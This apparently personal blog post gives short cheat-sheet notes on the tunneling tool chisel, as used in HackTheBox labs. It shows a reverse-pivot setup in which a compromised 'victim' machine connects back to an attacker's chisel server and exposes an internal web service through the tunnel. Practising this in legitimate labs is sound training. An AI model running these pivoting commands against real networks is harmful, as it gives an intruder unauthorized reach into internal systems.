---
layout: post
title: My Notes about Chisel (Tool for Tunneling)
tags: [System Hacking, Chisel]
comments: true
---

Hey guys today i am sharing my little notes about a insane tool called **chisel**. Chisel, one of the tool i am using mostly while doing HackTheBox.

Thanks to **ippsec** for teaching me about chisel.

I will show you some important usages of chisel with example.

## Chisel cheat sheet.

### Reverse Pivot - Example

* Here attacker IP is **10.14.14.14** and client IP is **10.10.10.10**.

* start chisel server on port 8000 (attacker system is server).

~~~
chisel server -p 8000 --reverse
~~~

   * --reverse : Tells the server that I want clients connecting in to be allowed to define reverse tunnels. This means clients connecting in can open listening ports on my kali box.

* from victim (10.10.10.10 is client) 

~~~
chisel client 10.14.14.14:8000 R:8001:172.18.0.3:80 (This will listen on port 8001 on all interface on attacker box). (Bad way)
~~~

~~~
chisel client 10.14.14.14:8000 R:127.0.0.1:8001:172.18.0.3:80 (Best way)
~~~

    → chisel connect to server 
    
    → and open port 8001 on remote box which is on server. R is for remote
    
    → if any packet on 8001 it will go through tunnel we created through 8000 and then send it out to 172.18.0.3:80
    
So now we can do a curl command from our kali box and we can now access website running on 172.18.0.3:80.




    
   
